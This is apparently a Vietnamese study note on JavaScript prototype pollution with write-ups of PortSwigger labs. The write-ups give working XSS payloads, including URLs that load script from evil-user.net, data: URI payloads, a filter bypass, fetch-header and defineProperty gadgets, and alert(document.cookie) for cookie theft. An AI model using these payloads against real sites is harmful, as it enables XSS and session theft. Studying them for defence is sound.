---
title: Prototype pollution

---

# What is prototype pollution?
- Ghi đè hoặc thêm thuộc tính vào `Object.prototype` trong JS/nodeJS
![image](https://hackmd.io/_uploads/HJlD3m_cWl.png)
- Attacker gửi payload chứa thuộc tính `__proto__.transport_url='evil-user.net'` vào `userObject`. Hàm `recursiveMerge()` hợp nhất dữ liệu không an toàn này, đẩy thuộc tính đó thẳng vào `Object.prototype` => các object khác trong hệ thống như `config` hay `defaults` tự động bị pollute và mang giá trị `transport_url: 'evil-user.net'` dù không được gán trực tiếp
- Mọi object được tạo ra sau đó (hoặc đang tồn tại) đều mặc định thừa kế thuộc tính độc hại này nếu chúng chưa được định nghĩa thuộc tính đó

# What is an object in JavaScript?
- một object trong JS chỉ là một tập hợp các cặp `key:value` được gọi là `properties` (các thuộc tính). VD object sau đây có thể đại diện cho một user:
```javascript!
const user = {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```
- Ta có thể truy cập các thuộc tính của một object bằng cách sử dụng `dot notation` (cú pháp dấu chấm) hoặc `bracket notation` (cú pháp dấu ngoặc vuông) để trỏ tới các key tương ứng của chúng
```javascript!
user.username    // "wiener"
user['userId']   // 01234
```
- Ngoài dữ liệu thì các thuộc tính cũng có thể chứa các hàm thực thi. Trong trường hợp này hàm được gọi là một method
```javascript!
const user = {
    username: "wiener",
    userId: 01234,
    exampleMethod: function() {
        // do something
    }
}
```
- VD trên là một object literal (đối tượng dạng nguyên bản) nghĩa là nó được tạo ra bằng cú pháp dấu ngoặc nhọn để khai báo rõ ràng các thuộc tính và giá trị ban đầu của chúng. Nhưng cần hiểu là gần như mọi thứ trong JS đều là một object ở tầng cơ sở

# What is a prototype in JavaScript?
- Mọi object trong JS đều được liên kết với một object khác, gọi là prototype của nó. Theo mặc định JS tự động gán cho các object mới một trong những prototype tích hợp sẵn của nó. VD strings tự động được gán `String.prototype` tích hợp. Bạn có thể xem thêm một số ví dụ về các global prototype này dưới đây:

```javascript!
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);     // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```
- Các object tự động kế thừa tất cả các thuộc tính từ prototype được gán cho chúng, trừ khi chúng đã có sẵn thuộc tính riêng với cùng một key, cho phép các dev tạo ra các object mới có thể tái sử dụng các thuộc tính và phương thức của các object hiện có
- Các prototype tích hợp sẵn cung cấp các thuộc tính và phương thức hữu ích để làm việc với các kiểu dữ liệu cơ bản. VD object `String.prototype` có phương thức `toLowerCase()` -> tất cả các chuỗi tự động có sẵn một phương thức để chuyển đổi thành chữ thường 

# How does object inheritance work in JavaScript?
- Bất cứ khi nào ta tham chiếu đến một thuộc tính của một object, engine JS đầu tiên sẽ cố gắng truy cập trực tiếp thuộc tính này trên chính object đó
- Nếu object không có thuộc tính tương ứng, engine JS sẽ tìm kiếm nó trên prototype của object để thay thế
- Giả sử có các object sau, điều này cho phép ta tham chiếu đến `myObject.propertyA`:
![image](https://hackmd.io/_uploads/Bybgz4d9We.png)
- Một `existingObject` chứa `propertyA` và `propertyB` đóng vai trò là `prototype` của `myObject`.`myObject` chỉ chứa `propertyC` nhưng do cơ chế kế thừa, `myObject` có thể gọi trực tiếp `propertyA` từ `existingObject`

- Ta có thể sử dụng console của browser để xem hành vi này trên thực tế. Đâu tiên tạo một object rỗng
- Gõ `myObject.`, browser hiện ra list gợi ý các thuộc tính ẩnconstructor, hasOwnProperty, isPrototypeOf
![image](https://hackmd.io/_uploads/B1x8f4u5Ze.png)

- Mặc dù không có thuộc tính hoặc phương thức nào được định nghĩa cho chính object đó, nó đã kế thừa một số từ `Object.prototype` tích hợp sẵn

# The prototype chain
- `prototype` của một object chỉ là một object khác, và bản thân nó cũng sẽ có `prototype` riêng của mình. Vì hầu như mọi thứ trong JS đều là một object ở tầng cơ sở, chuỗi này cuối cùng sẽ dẫn ngược về `Object.prototype` ở cấp cao nhất, mà prototype của chính nó đơn giản chỉ là null
![image](https://hackmd.io/_uploads/BJFB-Sd5Ze.png)
- Cấu trúc phân cấp từ trên xuống dưới. Đỉnh là `Object.prototype`. Dưới nó là các prototype cụ thể cho từng kiểu dữ liệu: `String.prototype`, `Array.prototype`, `Number.prototype`. Dưới cùng là các biến/object thực tế: biến chuỗi `username`, biến mảng `itemsInCart`, biến số `remainingStock`
- Các object kế thừa các thuộc tính không chỉ từ prototype trực tiếp của chúng, mà còn từ tất cả các object nằm trên chúng trong chuỗi prototype. Theo VD trên thì điều này có nghĩa là object `username` có quyền truy cập vào các thuộc tính và phương thức của cả `String.prototype` và `Object.prototype`

# Accessing an object's prototype using __proto__
- Mọi object đều có một thuộc tính đặc biệt mà ta có thể sử dụng để truy cập prototype của nó
- Mặc dù không có tên được chuẩn hóa chính thức, `__proto__` là tiêu chuẩn thực tế được hầu hết các browser sử dụng
- Ta có thể truy cập `__proto__` bằng cách sử dụng cú pháp dấu ngoặc vuông hoặc dấu chấm
```javascript!
username.__proto__
username['__proto__']
```
- thậm chí có thể xâu chuỗi các tham chiếu đến `__proto__` để leo dần lên prototype chain
```javascript!
username.__proto__                     // String.prototype
username.__proto__.__proto__           // Object.prototype
username.__proto__.__proto__.__proto__ // null -> Object.prototype
```

# Modifying prototypes
- Việc sửa đổi các prototype tích hợp sẵn (built-in) của JS hoàn toàn khả thi giống như bất kỳ object nào khác. Các dev có thể tùy chỉnh hoặc ghi đè (override) hành vi của các phương thức tích hợp sẵn và thậm chí thêm các phương thức mới để thực hiện các thao tác hữu ích

- VD JS cung cấp phương thức `trim()` cho các chuỗi, cho phép loại bỏ các khoảng trắng ở đầu hoặc cuối. Trước khi phương thức tích hợp sẵn này được tạo ra, các dev đôi khi đã thêm cách triển khai tùy chỉnh của riêng họ cho hành vi này vào object `String.prototype` bằng cách làm thứ gì đó tương tự như sau
```javascript!
String.prototype.removeWhitespace = function() {
    // loại bỏ khoảng trắng ở đầu và cuối
}
```
- Do có sự kế thừa prototype, tất cả các chuỗi sau đó sẽ có quyền truy cập vào phương thức này
```javascript!
let searchTerm = "  example  ";
searchTerm.removeWhitespace();   // => "example"
```

# How do prototype pollution vulnerabilities arise?
- Lỗ hổng sinh ra từ các hàm thao tác object như merge (hợp nhất), clone (sao chép), extend (mở rộng)
- Nguyên nhân: duyệt qua các key của JSON input (bằng `for...in` hoặc `Object.keys`) và gán giá trị đệ quy nhưng quên blacklist các key nhạy cảm (`__proto__`, `constructor`, `prototype`).
- Khi engine chạy đến đoạn `target["__proto__"]["evil"] = "payload"` nó không tạo ra key `__proto__` trong target, mà nó chui thẳng lên `Object.prototype` và gán `evil = "payload"`. Toàn cục bị pollute
- Việc thành công exploit prototype pollution cần các điều sau:
    - Source: nơi ta gửi payload vào (vd: endpoint API nhận JSON, hàm `merge()`, `clone()`, URL query string)
    - Gadget: Thuộc tính bị ô nhiễm, đóng vai trò làm cầu nối (vd: `options.shell`, `config.timeout`, `env.NODE_OPTIONS`). Nó được kế thừa từ Prototype
    - Sink: Nơi LỔ. Là các hàm nguy hiểm thực thi gadget đó (VD: `eval()`, `child_process.exec()`, `innerHTML`)
    
# Prototype pollution sources
- Một nguồn gây ra prototype pollution là bất kỳ input nào do user kiểm soát cho phép ta thêm các thuộc tính tùy ý vào các đối tượng prototype. Các nguồn phổ biến nhất như:
    - URL thông qua chuỗi query hoặc chuỗi phân mảnh (fragment string / hash)
    - Đầu vào dựa trên JSON
    - Web messages
# Prototype pollution via the URL
- Xem xét URL sau chứa query string: `https://vulnerable-website.com/?__proto__[evilProperty]=payload`

- Khi phân tích query string thành các cặp `key:value`, một URL parser có thể hiểu `__proto__` như một chuỗi tùy ý. Nhưng hãy xem điều gì xảy ra nếu các khóa và giá trị này sau đó được merged vào một đối tượng hiện có dưới dạng các thuộc tính
- Có thể nghĩ rằng thuộc tính `__proto__`, cùng với `evilProperty` lồng bên trong nó, sẽ chỉ được thêm vào đối tượng mục tiêu như sau
```javascript!
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```
- Nhưng tại một thời điểm nào đó thì thao tác recursive merge có thể gán giá trị của `evilProperty` bằng cách sử dụng một câu lệnh tương đương như sau
`targetObject.__proto__.evilProperty = 'payload';`

- engine JS coi `__proto__` là một getter cho prototype
=> `evilProperty` được gán cho đối tượng prototype trả về thay vì chính bản thân đối tượng mục tiêu
- Giả sử đối tượng mục tiêu sử dụng `Object.prototype` mặc định, tất cả các đối tượng trong runtime JS lúc này sẽ kế thừa `evilProperty`, trừ khi chúng đã có sẵn một thuộc tính của riêng chúng với khóa trùng khớp

# Prototype pollution via JSON input
- Các object do user kiểm soát thường được dẫn xuất từ một chuỗi JSON bằng cách sử dụng phương thức `JSON.parse()`
- JSON.parse() cũng coi bất kỳ key nào trong đối tượng JSON như một string tùy ý, bao gồm cả những thứ như `__proto__`
=> tiềm năng khác cho prototype pollution

- Giả sử hacker inject JSON độc hại sau đây thông qua một web message:
``` javascript!
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

- Nếu đoạn JSON này được chuyển đổi thành một JS object thông qua phương thức `JSON.parse()`, đối tượng kết quả trên thực tế sẽ có một thuộc tính với khóa là `__proto__`
```javascript!
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```
- Nếu object được tạo qua `JSON.parse()` sau đó được merge vào một object hiện có mà không có key sanitization phù hợp => sẽ dẫn đến prototype pollution trong quá trình gán, như chúng ta đã thấy trong ví dụ dựa trên URL trước đó

# Prototype pollution sinks
- Sink là đích đến: là các hàm nhạy cảm có khả năng thực thi lệnh (RCE) hoặc render mã HTML/JS độc (XSS)
- Dev thường chỉ sanitize ở phần trước (VD: filter biến `req.body.username`). Nhưng Sink lại nằm ở chỗ khác (VD: các biến nội bộ như `config.env` hay `options.shell` truyền vào hàm `exec`)
- Dev cho rằng user không thể chạm tới biến config này, nên không cần filter nhưng ta đã gửi payload vào đó thông qua `Object.prototype`
- Node.js sinks: `exec(`, `spawn(`, `fork(`, `eval(`, `setTimeout(`, `setInterval(`, `Function(`, `require(`
- Client-side sinks: `innerHTML`, `outerHTML`, `document.write(`, `eval(`, `setTimeout(`

# Prototype pollution gadgets
- Một công cụ khai thác (gadget) cung cấp một phương tiện để biến lỗ hổng prototype pollution thành một mã khai thác thực tế
- Điều kiện: phải có sự kế thừa (inheritance), nếu object không kế thừa thì gadget vô dụng
- Một thuộc tính không thể là gadget nếu nó được định nghĩa trực tiếp trên chính đối tượng đó
- Ghi đè trực tiếp: đã gán cứng giá trị (VD: `options.shell = '/bin/bash'`) => payload của ta ở prototype sẽ bị bỏ qua
- Object.create(null): object sinh ra không có cha mẹ, không có `__proto__`, ngắt hoàn toàn chuỗi pollute

# Example of a prototype pollution gadget
`let transport_url = config.transport_url || defaults.transport_url;`
- Nếu `config.transport_url` bị undefined, nó lùi về `defaults`. Nhưng nếu ta pollute prototype cả `config` và `defaults` đều sẽ lấy payload của ta
- Tưởng tượng mã của thư viện sử dụng `transport_url` này để thêm một tham chiếu kịch bản vào trang
```javascript!
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```
- Gadget: thuộc tính `transport_url`
- Sink: `document.createElement('script')` và `script.src`. Đây là điểm tấn công dẫn đến thực thi JS tùy ý (DOM XSS)

- Nếu prototype có thể bị ô nhiễm thông qua một query parameter, hacker chỉ cần dụ nạn nhân truy cập vào một URL được tạo để khiến browser của họ `import` một file JS độc từ một domain do hacker kiểm soát
`https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`

- Bằng cách cung cấp một URL dạng `data:`, hacker cũng có thể nhúng trực tiếp một payload XSS vào bên trong chuỗi truy vấn như sau
`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`

- Suffix bypass: gán cứng chữ `/example.js` vào cuối URL. hacker exploit bằng cách dùng data URI (`data:,...`) và dùng dấu `//` để biến đoạn hardcode đó thành comment trong cú pháp JS

# Finding client-side prototype pollution sources manually
1. inject một thuộc tính tùy ý thông qua query string, URL fragment/hash, và bất kỳ đầu vào JSON nào. VD:
`vulnerable-website.com/?__proto__[foo]=bar`
2. Trong console của browser hãy kiểm tra `Object.prototype` để xem ta đã làm ô nhiễm thành công nó bằng thuộc tính tùy ý của mình hay chưa
```javascript!
Object.prototype.foo
// "bar" chỉ ra rằng bạn đã làm ô nhiễm prototype thành công
// undefined chỉ ra rằng cuộc tấn công không thành công
```
3. Nếu thuộc tính không được thêm vào prototype, thử sử dụng các tech khác, như chuyển sang dot notation thay vì bracket notation, hoặc ngược lại
`vulnerable-website.com/?__proto__.foo=bar`
4. Lặp lại quá trình trên cho từng nguồn khả nghi\

**Nếu không tech nào ở trên thành công, ta vẫn có thể làm ô nhiễm prototype thông qua `constructor` của nó**

# Finding client-side prototype pollution sources using DOM Invader
- Fuzzing thủ công (đổi payload, F5, check console) rất tốn thời gian, đặc biệt với các trang web SPA phức tạp có hàng chục tham số ẩn
=> Sử dụng DOM Invader, một extension tích hợp sẵn trong trình duyệt chromium của burp suite
- Nó auto inject các chuỗi ngẫu nhiên vào mọi source (URL, hash, web messages) và tự động xem `Object.prototype` có bị biến đổi hay không

# Finding client-side prototype pollution gadgets manually
- Khi đã xác định được một source cho phép thêm các thuộc tính tùy ý vào `Object.prototype` toàn cục, tiếp theo ta tìm một công cụ khai thác (gadget) phù hợp mà ta có thể sử dụng để tạo payload
    - Xem lướt qua source code và xác định bất kỳ thuộc tính nào được ứng dụng hoặc bất kỳ thư viện nào mà nó import sử dụng
    - Trong burp bật tính năng chặn bắt phản hồi (Proxy > Options > Intercept server responses) và chặn bắt phản hồi chứa đoạn JS mà ta muốn kiểm thử
    - Thêm một câu lệnh debugger vào đầu tập lệnh, sau đó forward bất kỳ request và response nào còn lại
    - Trong browser của burp, truy cập vào trang nơi tập lệnh mục tiêu được tải. Câu lệnh debugger sẽ tạm dừng quá trình thực thi của tập lệnh
    - Trong khi tập lệnh vẫn đang bị tạm dừng, chuyển sang tab console và nhập lệnh sau, thay thế `YOUR-PROPERTY` bằng một trong những thuộc tính mà bạn cho là một gadget tiềm năng
    ``` javascript!
    Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
        get() {
            console.trace();
            return 'polluted';
        }
    })
    ```
    - Thuộc tính này được thêm vào `Object.prototype` toàn cục, và browser sẽ ghi lại một stack trace ra console bất cứ khi nào thuộc tính này được truy cập
    - Nhấn nút để tiếp tục thực thi tập lệnh và theo dõi console. Nếu một stack trace xuất hiện điều này xác nhận rằng thuộc tính đã được truy cập ở đâu đó bên trong ứng dụng
    - Mở rộng stack trace và sử dụng liên kết được cung cấp để nhảy đến dòng code nơi thuộc tính đang được đọc
    - Sử dụng các điều khiển debugger của browser, step through qua từng giai đoạn thực thi để xem thuộc tính có được truyền vào một điểm sink hay không, chẳng hạn như `innerHTML` hoặc `eval()`
    - Lặp lại quá trình trên cho bất kỳ thuộc tính nào mà ta cho là các gadget tiềm năng


# Finding client-side prototype pollution gadgets using DOM Invader
- Khai thác thủ công vướng phải rào cản source code bị minified/obfuscated
=> Bật tính năng `Scan for gadgets` của DOM Invader
- Chuyển từ việc đọc hiểu code sang blackbox fuzzing tốc độ cao. Nó không cần hiểu code, nó chỉ xem liệu payload có chạm được vào sink (`innerHTML`, `eval`...) hay không rồi tự động nhả PoC XSS

**[LAB 1](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)**

- Trong browser thử pollute `Object.prototype` bằng cách inject một thuộc tính tùy ý qua query string
`/?__proto__[foo]=bar`
![image](https://hackmd.io/_uploads/ByeCE6ucZg.png)

- Nhập `Object.prototype` ở phần Console, ta thấy hiện có một thuộc tính `foo` với giá trị `bar` => tìm thành công nguồn prototype pollution
![image](https://hackmd.io/_uploads/SJbTE6u9-e.png)

**Tìm sinks**
- Trong file `searchLogger.js`, nếu đối tượng `config` có thuộc tính `transport_url` nó sẽ được dùng để chèn động một thẻ script vào DOM
- không có thuộc tính `transport_url` nào được định nghĩa cho đối tượng `config` => một gadget tiềm năng để kiểm soát thuộc tính src của phần tử `<script>`
![image](https://hackmd.io/_uploads/BkQYH6O9bx.png)

- Sử dụng nguồn pollution đã xác định trước đó, thử inject một thuộc tính `transport_url` tùy ý
`/?__proto__[transport_url]=foo`
![image](https://hackmd.io/_uploads/r1IPUaO5be.png)

- Ở tab Elements thấy một phần tử `<script>` đã được render trên trang, với thuộc tính src là `foo`
![image](https://hackmd.io/_uploads/HyFKU6dcWg.png)

- Bây giờ inject một PoC XSS, dùng `data:` 
`/?__proto__[transport_url]=data:,alert("hehe");`
![image](https://hackmd.io/_uploads/rJxmDaucZl.png)
- thấy `alert("hehe")` được gọi lên

**[LAB 2](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)**
- thử pollute `Object.prototype` bằng cách inject một thuộc tính tùy ý qua query string `/?__proto__[foo]=bar`
- thấy thuộc tính `foo` không được thêm vào
![image](https://hackmd.io/_uploads/ryz2Kpuc-g.png)
- thử sử dụng một vector prototype pollution thay thế là `/?__proto__.foo=bar`
- lúc này nó đã có thuộc tính `foo` riêng với giá trị `bar`
![image](https://hackmd.io/_uploads/B1XJ96uqbx.png)
**Tìm gadget**
- Tìm đến `Sources` của browser để xem
- thấy có một sink `eval()` trong file `searchLoggerAlternative.js`
- thấy thuộc tính `manager.sequence` được truyền vào `eval()` nhưng theo mặc định nó không được định nghĩa
![image](https://hackmd.io/_uploads/HkOX5a_9Wl.png)
- Sử dụng nguồn vừa tìm được thử inject thuộc tính sequence chứa payload XSS `/?__proto__.sequence=alert(1)`
- Quan sát thấy payload không work
- Ở `Console` thấy một error
![image](https://hackmd.io/_uploads/Bk4o9Tu5bl.png)
- Click vào liên kết ở đầu stack trace để nhảy đến dòng gọi `eval()`
![image](https://hackmd.io/_uploads/SyYljauq-g.png)
- Click vào số dòng để đặt một breakpoint,sau đó refresh trang
- Di qua tham chiếu `manager.sequence` và thấy giá trị của nó là `alert(1)1` => ta đã truyền payload vào sink thành công nhưng một ký tự số 1 đang bị nối thêm vào nó dẫn đến cú pháp invalid JS syntax
![image](https://hackmd.io/_uploads/ryA-iT_qZe.png)
- Click lại vào số dòng để gỡ breakpoint, bấm icon play để tiếp tục run code
- Biến nó thành một phép toán trừ: `eval("alert(1)-1")`. JS sẽ chạy `alert(1)` trước, sau đó lấy kết quả (là `undefined`) trừ đi `1`. Dù kết quả phép tính ra `NaN` nhưng hàm `alert()` đã work
- Thêm một ký tự dấu trừ (-) vào cuối payload để sửa lại JS syntax
`/?__proto__.sequence=alert(1)`
- thấy `alert(1)` được gọi
![image](https://hackmd.io/_uploads/HJ6UhpOqZe.png)

# Prototype pollution via the constructor
- Ta chỉ mới xem cách ta có thể lấy tham chiếu đến các prototype objects thông qua `__proto__`
- Một cách filter phổ biến là loại bỏ bất kỳ thuộc tính nào có khóa `__proto__` khỏi các đối tượng do user kiểm soát trước khi merging chúng
- Trừ khi prototype của nó được đặt là `null`, mọi JS object đều có một thuộc tính `constructor`, chứa tham chiếu đến hàm tạo đã được sử dụng để tạo ra nó
- VD ta có thể tạo một đối tượng mới bằng literal syntax hoặc bằng cách gọi rõ hàm tạo `Object()` như:
```javascript!
let myObjectLiteral = {};
let myObject = new Object();
```
- Ta có thể tham chiếu đến constructor `Object()` thông qua thuộc tính constructor tích hợp sẵn:
```javascript!
myObjectLiteral.constructor    // function Object(){...}
myObject.constructor           // function Object(){...}
```
- `functions` về bản chất cũng chỉ là các đối tượng. Mỗi hàm tạo có một thuộc tính prototype, trỏ đến prototype sẽ được gán cho bất kỳ đối tượng nào được tạo bởi constructor này => ta cũng có thể truy cập prototype của bất kỳ đối tượng nào như sau
```javascript!
myObject.constructor.prototype   // Object.prototype
myString.constructor.prototype   // String.prototype
myArray.constructor.prototype    // Array.prototype
```
- Vì `myObject.constructor.prototype` hoàn toàn tương đương với `myObject.__proto__` => một vector thay thế cho prototype pollution
![image](https://hackmd.io/_uploads/S1pedO59Ze.png)

## PoC
- Qua JSON
```javascript!
// payload cũ block
// {"__proto__": {"isAdmin": true}}

// payload bypass
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```
- Qua URL/query string
```javascript!
// dạng ngoặc vuông
?constructor[prototype][transport_url]=data:,alert(1)

// dạng dấu chấm
?constructor.prototype.transport_url=data:,alert(1)
```

# Bypassing flawed key sanitization
- dev sử dụng hàm `replace('__proto__', '')` để xóa keyword nguy hiểm, nhưng lại chỉ cho nó chạy đúng 1 lần (không dùng đệ quy hoặc vòng lặp while)
- Hacker bẻ đôi từ khóa mục tiêu `__proto__`, nhét một từ khóa mục tiêu khác vào giữa `__pro` + `__proto__` + `to__`
- Khi WAF đi qua nó thấy `__proto__` ở giữa thì xoá đi, lúc này phần đầu và phần đuôi bị tự động ghép lại với nhau, khôi phục thành chữ `__proto__` nguyên vẹn và lọt thẳng vào hàm merge bên dưới
- 

**[LAB 3](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)**

- thử pollute `Object.prototype` với `/?__proto__.foo=bar`
![image](https://hackmd.io/_uploads/S1579u99Zl.png)

- thấy thuộc tính `foo` inject vào chưa được thêm
- Thử các vector prototype pollution khác như
`/?__proto__[foo]=bar`
`/?constructor.prototype.foo=bar`
- thì `Object.prototype` cũng không bị sửa đổi

- Ta sẽ đọc Source JS để nghiên cứu cách mà browser filter
- ta thấy `deparamSanitized.js` sử dụng hàm `sanitizeKey()` (được định nghĩa trong `searchLoggerFiltered.js`) để bỏ đi các khóa thuộc tính có thể khai thác dựa trên một blacklist
- Nhưng nó không áp dụng filter này một cách đệ quy 
![image](https://hackmd.io/_uploads/Hylj9dc5Zg.png)
![image](https://hackmd.io/_uploads/ry7h5_qqbl.png)

- thử inject một trong những key bị chặn theo cách sao cho vẫn còn nguyên vẹn sau quá trình sanitize như:
```javascript!
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```
![image](https://hackmd.io/_uploads/BkMbi_9q-e.png)
- Thấy rằng đã có thuộc tính `foo` với value `bar`
- Đọc lại Sources ta thấy `searchLogger.js` chèn động một thẻ script vào DOM sử dụng thuộc tính `transport_url` của đối tượng `config` nếu nó tồn tại
- không có thuộc tính `transport_url` nào được thiết lập cho đối tượng `config` => một gadget
![image](https://hackmd.io/_uploads/r1nk6d9cZg.png)
- Sử dụng nguồn prototype pollution đã xác định trước đó thử inject một thuộc tính `transport_url` bất kì
`/?__pro__proto__to__[transport_url]=foo`
- thấy một phần tử `<script>` đã được render với thuộc tính `src` là `foo`
![image](https://hackmd.io/_uploads/ryaLjd59-l.png)
- Sửa payload trên URL để inject poc XSS
`/?__pro__proto__to__[transport_url]=data:,alert(1);`
- thấy `alert(1)` được gọi
![image](https://hackmd.io/_uploads/Bkjds_9cbg.png)


**[LAB 4](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)**

- Bật DOM Invader và bật prototype pollution
![image](https://hackmd.io/_uploads/H1mCJY99-l.png)
- Quan sát thấy DOM Invader đã xác định được 2 vector prototype pollution trong thuộc tính hash, tức là chuỗi phân mảnh URL
![image](https://hackmd.io/_uploads/r1V61tq5Zl.png)
- Click `Scan for gadgets`. Một tab mới sẽ mở ra, tại đây DOM Invader bắt đầu quét các gadgets bằng cách sử dụng source đã chọn
- Quan sát thấy DOM Invader đã truy cập thành công vào sink `setTimeout()` thông qua gadget `hitCallback`
![image](https://hackmd.io/_uploads/HyY2yYq5bx.png)
- Click Exploit, DOM Invader sẽ tự động tạo một mã khai thác PoC và gọi `alert(1)`
![image](https://hackmd.io/_uploads/HyGllYc9Zx.png)
- Trong phần body của Exploit server tạo một payload để redirect victim đến một URL độc hại sau:
![image](https://hackmd.io/_uploads/rJJSlt95-e.png)
![image](https://hackmd.io/_uploads/H17IlFcq-e.png)
- test payload trên thấy rằng ta được điều hướng đến trang chủ của bài lab và payload `alert(document.cookie)` được kích hoạt => solved
![image](https://hackmd.io/_uploads/S1kdxtc5Zx.png)

# Prototype pollution via browser APIs
- Web browser mặc định cung cấp rất nhiều API như `fetch()`, `Object.defineProperty()`, `window.open()`, `setTimeout()`. Các API này nhận vào các tham số cấu hình
- dev thường chỉ sanitize dữ liệu đầu vào khi nó đi vào các hàm do chính họ hoặc thư viện ngoài viết. Họ có xu hướng tin tưởng tuyệt đối vào các hàm native (hàm gốc) của browser
- Nếu dev chặn XSS ở thư viện Vue/react, ta sẽ dùng prototype pollution để biến các API trình duyệt thành gadget, từ đó XSS hoặc thậm chí thay đổi luồng HTTP request

# Prototype pollution via fetch()
- API Fetch cung cấp một cách đơn giản cho các dev kích hoạt các HTTP request bằng JS
- `fetch()` nhận vào hai tham số là `url` và `options`
    - URL mà bạn muốn gửi request đến
    - Một options object cho phép kiểm soát các phần của request, chẳng hạn như method, headers, body, v.v....
```javascript!
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
```
- ta đã định nghĩa rõ ràng các thuộc tính `method` và `body`, nhưng có một số thuộc tính khả thi khác mà chúng ta đã undefined. 
- nếu một hacker có thể tìm thấy một source phù hợp, chúng có khả năng pollute `Object.prototype` bằng thuộc tính `headers` của riêng chúng
- Thuộc tính này sau đó có thể được kế thừa bởi options object truyền vào `fetch()` và tiếp đó được sử dụng để tạo ra request

```javascript!
fetch('/my-products.json', {method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```
- đoạn code trên có khả năng bị dính DOM XSS thông qua prototype pollution
- Ta có thể pollute `Object.prototype` bằng một thuộc tính `headers` chứa một header `x-username` như 
`?__proto__[headers][x-username]=<img/src/onerror=alert(1)>`

- Giả sử ở server-side header này được sử dụng để thiết lập giá trị cho thuộc tính `x-username` trong file JSON trả về
- Trong đoạn code client-side có lỗ hổng ở trên giá trị này sau đó được gán cho biến `username`, và cuối cùng được truyền vào sink `innerHTML` => DOM XSS.

- Flow: `URL Parameter -> Object.prototype (trình duyệt) -> HTTP Request Header -> Backend NodeJS/PHP -> JSON Response -> innerHTML -> XSS`

## PoC
- Tạo URL: `https://target.com/dashboard?__proto__[headers][x-username]=<img src=x onerror=alert(document.cookie)>`
- Hàm xử lý URL parse cái query trên và gán
`Object.prototype.headers = {"x-username": "<img src=x onerror=alert(document.cookie)>"}`
- Kích hoạt gadget (browser API fetch)
    - Đoạn mã JS của trang web chạy hàm `fetch('/my-products.json', {method:"GET"})`. Vì dev không định nghĩa headers, nó lôi cái headers từ prototype ra xài

- Request tới server: 
```java!
GET /my-products.json HTTP/1.1
Host: target.htb
x-username: <img src=x onerror=alert(document.cookie)>
```
- Server lấy cái header đó đắp vào JSON
```jsonld!
{
  "x-username": "<img src=x onerror=alert(document.cookie)>",
  "products": [...]
}
```
- frontend nhận JSON về, lấy thuộc tính `data['x-username']` ra và cho thẳng vào `message.innerHTML = 'My products. Logged in as <b><img src=x onerror=alert(document.cookie)></b>';`
=> lấy được session cookie của victim

# Prototype pollution via Object.defineProperty()
```javascript!
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```
- Dùng `Object.defineProperty` để khóa cứng cái gadget lại, không cho ghi đè, không cho kế thừa
- Hàm này nhận vào một Object `descriptor` (tham số thứ 3). Do dev chỉ quan tâm đến việc khóa (`configurable: false`, `writable: false`) mà không định nghĩa value khởi tạo, khoảng trống đã xuất hiện
- Bypass: browser sẽ cố tìm thuộc tính `value` bên trong cái `descriptor` kia để gán cho gadget. Không thấy thì nó mò lên `Object.prototype.value`. Ta chỉ cần pollute cái value này là được

## PoC
```javascript!
// dev phát hiện ra biến "transport_url" hay bị hacker pollute để chèn XSS
// dev quyết định khóa cứng nó lại
let config = {};
Object.defineProperty(config, 'transport_url', {
    configurable: false,
    writable: false
});

// dev nghĩ là có pollute Object.prototype.transport_url thì config.transport_url cũng bị chặn đứng rồi

// sau đó code vẫn chạy bình thường
let script = document.createElement('script');
script.src = config.transport_url; 
document.body.appendChild(script);
```

- Hacker không pollute `transport_url` nữa, hacker pollute biến `value`
- trên URL: `/?__proto__[value]=data:,alert('Bypass_DefineProperty')`
- Khi chạy đến dòng `Object.defineProperty`, browser nhìn vào {`configurable: false, writable: false}`. Nó tự hỏi là giá trị khởi tạo (value) của cái thuộc tính này là gì?
- Nó nhìn lên `Object.prototype.value` và thấy chuỗi `data:,alert....`
=> browser tự động gán chuỗi độc hại đó vào `config.transport_url`, sau đó mới khóa nó lại => bypass

**[LAB 5](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)**

![image](https://hackmd.io/_uploads/HyN_3F95Wg.png)

![image](https://hackmd.io/_uploads/Bytd2t9q-g.png)

![image](https://hackmd.io/_uploads/ryEF2t59Wg.png)

# Server-side prototype pollution
## Why is server-side prototype pollution more difficult to detect? 
